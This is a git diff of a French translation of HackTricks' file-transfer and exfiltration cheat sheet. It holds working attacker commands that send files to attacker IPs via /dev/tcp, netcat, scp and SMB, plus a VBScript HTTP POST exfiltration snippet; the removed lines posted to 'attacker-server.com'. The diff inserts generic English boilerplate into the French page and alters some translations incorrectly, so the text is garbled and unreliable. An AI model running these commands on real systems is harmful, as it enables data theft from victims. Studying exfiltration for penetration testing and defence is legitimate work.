@@ -8,7 +8,7 @@ Autres façons de soutenir HackTricks :
 
 * Si vous voulez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
@@ -16,7 +16,7 @@ Autres façons de soutenir HackTricks :
 
 **Groupe de sécurité Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Téléverser des fichiers
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer affiche les GET et POST (également les en-têtes)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Module Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -150,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Client** Windows
+### **Client Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -187,51 +187,27 @@ service smbd restart
 ```
 # Exfiltration
 
+## Introduction
+
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using command and control (C2) channels, exfiltrating data over DNS, or leveraging legitimate services like Dropbox for data exfiltration.
+
 ## Techniques
 
-### Exfiltration Over Command and Control Channel
+### Command and Control (C2) Channels
 
-When an attacker has compromised a system, they may exfiltrate data over the command and control (C2) channel. This can be done by executing commands on the compromised system to transfer data to the attacker's server.
+C2 channels are commonly used by attackers to exfiltrate data from compromised systems. These channels allow the attacker to maintain control over the compromised system and exfiltrate data without being detected.
 
-### Exfiltration Over Alternative Protocols
+### DNS Exfiltration
 
-Attackers may exfiltrate data using alternative protocols such as DNS, ICMP, or HTTPS to bypass network security controls that only monitor traditional protocols like HTTP.
+DNS exfiltration involves encoding data within DNS queries or responses to exfiltrate data from a target network. This technique can be used to bypass network security controls and exfiltrate data to an external server controlled by the attacker.
 
-### Exfiltration Over Encrypted Channels
+### Using Legitimate Services
 
-To avoid detection, attackers may exfiltrate data over encrypted channels such as SSL/TLS to make it harder for security tools to inspect the data being transferred.
+Attackers can leverage legitimate services like Dropbox, Google Drive, or OneDrive to exfiltrate data from a target system. By using these services, attackers can blend in with normal network traffic and avoid detection by security controls.
 
-## Tools
+## Tools and Resources
 
-### Data Exfiltration Tools
-
-- **Netcat**: A versatile networking utility that can be used for data transfer.
-- **Wget**: A command-line utility for downloading files from the web, which can also be used for exfiltration.
-- **Curl**: Another command-line tool for transferring data with support for various protocols.
-
-### C2 Frameworks
-
-- **Metasploit**: A popular framework for developing and executing exploit code against a remote target machine.
-- **Cobalt Strike**: A commercial, full-featured, penetration testing tool that includes a robust C2 framework.
-
-### Traffic Obfuscation Tools
-
-- **Mimikatz**: A post-exploitation tool that can be used to extract plaintext passwords, hash, PIN code, and kerberos tickets from memory.
-- **PsExec**: A command-line tool that enables the execution of processes on remote systems.
-
-## Detection
-
-### Network Monitoring
-
-- Monitor network traffic for any unusual patterns or spikes in data transfer volume.
-- Look for connections to known malicious IP addresses or domains.
-- Analyze DNS requests for unusual domain names or long subdomains that could be used for data exfiltration.
-
-### Endpoint Monitoring
-
-- Monitor system logs for suspicious activities such as large file transfers or unusual process executions.
-- Look for signs of data encryption or obfuscation techniques being used by attackers.
-- Implement file integrity monitoring to detect unauthorized changes to sensitive files.
+There are various tools and resources available to facilitate data exfiltration, including custom C2 frameworks, DNS exfiltration tools, and scripts for exfiltrating data using legitimate services. These tools can help attackers exfiltrate data efficiently and evade detection by security measures.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -247,7 +223,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la victime a SSH, l'attaquant peut monter un répertoire de la victime vers l'attaquant.
+Si la victime dispose de SSH, l'attaquant peut monter un répertoire de la victime vers l'attaquant.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -265,7 +241,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Téléverser un fichier à la victime
+### Télécharger un fichier sur la victime
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -294,7 +270,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec python:
+Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un SMTP pour recevoir les données avec python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -326,19 +302,37 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### Exfiltration
+### Introduction
 
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method and target URL, and sending the data in the request body. The following code snippet demonstrates how data can be exfiltrated using VBScript:
+VBScript is a scripting language that is commonly used for Windows systems. It can be used for various tasks, including exfiltration of data from a compromised system. VBScript can be executed using the `cscript.exe` or `wscript.exe` interpreters.
 
-```vbscript
-Dim objHTTP
+### Exfiltration Techniques
+
+#### Writing to Files
+
+VBScript can write data to files on the compromised system. This can be achieved using the `FileSystemObject` to create and write to a file.
+
+```vbs
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.CreateTextFile("C:\path\to\file.txt", True)
+objFile.Write "Data to exfiltrate"
+objFile.Close
+```
+
+#### Sending HTTP Requests
+
+VBScript can also send HTTP requests to exfiltrate data to an external server. This can be done using the `MSXML2.ServerXMLHTTP` object.
+
+```vbs
 Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objHTTP.Open "POST", "http://attacker-server.com/data", False
+objHTTP.Open "POST", "http://www.example.com/endpoint", False
 objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
 objHTTP.send "data=exfiltrated_data"
 ```
 
-In this example, the VBScript code creates an HTTP POST request to "http://attacker-server.com/data" with the exfiltrated data in the request body. The attacker can then receive and process the exfiltrated data on their server.
+### Conclusion
+
+VBScript provides various methods for exfiltrating data from a compromised system, including writing to files and sending HTTP requests. It is important to use these techniques responsibly and ethically.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -392,7 +386,7 @@ Ensuite, copiez-collez le texte dans le shell Windows et un fichier appelé nc.e
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -404,7 +398,7 @@ Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
